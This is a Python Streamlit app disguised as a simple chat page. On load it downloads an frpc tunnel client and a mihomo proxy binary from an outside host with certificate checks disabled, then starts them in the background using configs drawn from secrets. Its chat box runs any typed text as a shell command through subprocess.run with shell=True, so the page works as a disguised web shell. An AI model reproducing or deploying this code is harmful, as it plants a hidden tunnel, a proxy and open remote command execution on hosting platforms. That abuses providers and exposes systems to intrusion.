import streamlit as st
import pathlib
import time
import subprocess
import ssl
import urllib.request
import shutil
from datetime import datetime
import os
import base64

ROOT_DIR = pathlib.Path("/tmp")
FRPC_BIN_FILE = ROOT_DIR / "frpc"
FRPC_BIN_CONFIG = ROOT_DIR / "frpc.toml"
FRPC_PID = ROOT_DIR / "frpc.pid"
PROXY_BIN_FILE = ROOT_DIR / "proxy"
PROXY_BIN_CONFIG = ROOT_DIR / "proxy.yaml"
PROXY_PID = ROOT_DIR / "proxy.pid"

def debug_log(message):
    print(message)
    write_debug_log(message)

def write_debug_log(message):
    try:
        with open('/tmp/debug.log', 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"写入日志失败: {e}")

def download_file(url, target_path, mode='wb'):
    retries = 0
    max_retries = 3
    current_delay = 10
    backoff_factor = 2
    while retries <= max_retries:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, context=ctx) as response, open(target_path, mode) as out_file:
                shutil.copyfileobj(response, out_file)
            return True
        except Exception as e:
            if retries < max_retries:
                debug_log(f"下载文件失败: {url}, 错误: {e}, 等待 {current_delay:.2f} seconds...")
                time.sleep(current_delay)
                current_delay *= backoff_factor # Increase delay for next retry (exponential backoff)
                retries += 1
            else:
                debug_log(f"下载文件失败: {url}, 错误: {e}")
                return False

def download_binary(download_url, target_path):
    debug_log(f"正在下载 {download_url}...")
    success = download_file(download_url, target_path)
    if success:
        debug_log(f"{download_url} 下载成功!")
        os.chmod(target_path, 0o755)
        return True
    else:
        debug_log(f"{download_url} 下载失败!")
        return False


# 创建启动脚本
def create_startup_script(): 
    try:
        frpc = st.secrets["PRPC_CONFIG"]
        if frpc:
            frpc = base64.standard_b64decode(frpc)
            with open(FRPC_BIN_CONFIG, 'w+', encoding='utf-8') as f:
                f.write(str(frpc, encoding='utf-8'))
        else:
            debug_log("FRPC_CONFIG NOT FOUND")
        proxy = st.secrets["PROXY_CONFIG"]
        if proxy:
            proxy = base64.standard_b64decode(proxy)
            with open(PROXY_BIN_CONFIG, 'w+', encoding='utf-8') as f:
                f.write(str(proxy, encoding='utf-8'))
        else:
            debug_log("PROXY_CONFIG NOT FOUND")
    except Exception as e:
        debug_log(f"配置操作失败: {e}")
        return 
    start_script_path = ROOT_DIR / "frpc.sh"
    start_content = f'''#!/bin/bash
cd {ROOT_DIR.resolve()}
{FRPC_BIN_FILE} -c {FRPC_BIN_CONFIG} > frpc.log 2>&1 &
echo $! > {FRPC_PID}
'''
    start_script_path.write_text(start_content)
    os.chmod(start_script_path, 0o755)

    start_script_path = ROOT_DIR / "proxy.sh"
    start_content = f'''#!/bin/bash
cd {ROOT_DIR.resolve()}
{PROXY_BIN_FILE} -d . -f {PROXY_BIN_CONFIG} > proxy.log 2>&1 &
echo $! > {PROXY_PID}
'''
    start_script_path.write_text(start_content)
    os.chmod(start_script_path, 0o755)


# 启动服务
def start_services():
    debug_log("正在启动服务...")
    if not check_status(FRPC_PID):
        subprocess.run(str(ROOT_DIR / "frpc.sh"), shell=True)
        time.sleep(5)
    if not check_status(PROXY_PID):
        subprocess.run(str(ROOT_DIR / "proxy.sh"), shell=True)
        time.sleep(5)
    debug_log("服务启动命令已执行. ")

# 检查脚本运行状态
def check_status(pid_path):
    running = pid_path.exists() and os.path.exists(f"/proc/{pid_path.read_text().strip()}")
    if running:
        debug_log(f"当前状态 active : {pid_path.read_text().strip()}")
        return True
    else:
        debug_log(f"当前状态 deactive ")
        return False

# 安装过程
def install():
    if not ROOT_DIR.exists():
        ROOT_DIR.mkdir(parents=True, exist_ok=True)
    debug_log("开始安装过程:")
    url = "https://api.quinn.eu.org/api/file/frpc"
    success = download_binary(url, FRPC_BIN_FILE)
    if not success:
        return
    url = "https://api.quinn.eu.org/api/file/mihomo"
    success = download_binary(url, PROXY_BIN_FILE)
    if not success:
        return
    create_startup_script()
    start_services()    

st.header("欢迎来到streamlit项目")

running = check_status(FRPC_PID) and check_status(PROXY_PID)
if st.button("运行", disabled=running):
    install()
if not running:
    install()

# Initialize chat history
if "messages" not in st.session_state:
    st.session_state.messages = [{"role": "assistant", "content": "一起来 happy"}]

# Display chat messages from history on app rerun
for message in st.session_state.messages:
    with st.chat_message(message["role"]):
        if message["role"] == "assistant":
            st.code(message["content"], language='Go')
        else:
            st.markdown(message["content"])

# Accept user input
if prompt := st.chat_input("请输入内容:"):
    # Add user message to chat history
    st.session_state.messages.append({"role": "user", "content": prompt})
    # Display user message in chat message container
    with st.chat_message("user"):
        st.markdown(prompt)

    # Display assistant response in chat message container
    with st.chat_message("assistant"):
        message_placeholder = st.empty()
        full_response = ""
        try:
            result = subprocess.run(prompt, capture_output=True, shell=True, text=True, check=False)
            assistant_response = result.stdout.strip()
            if result.stderr:
                assistant_response = result.stderr.strip()
        except subprocess.CalledProcessError as e:
            assistant_response = f"错误: {e}"
        except Exception as e:
            assistant_response = f"{e}"
        
        if assistant_response is None:
            assistant_response = ''
        # Simulate stream of response with milliseconds delay
        for chunk in assistant_response.split('\n'):
            full_response += chunk + "\n"
            time.sleep(0.05)
            # Add a blinking cursor to simulate typing
            message_placeholder.code(full_response + "▌", language='Go')
        message_placeholder.code(full_response, language='Go')
    # Add assistant response to chat history
    st.session_state.messages.append({"role": "assistant", "content": full_response})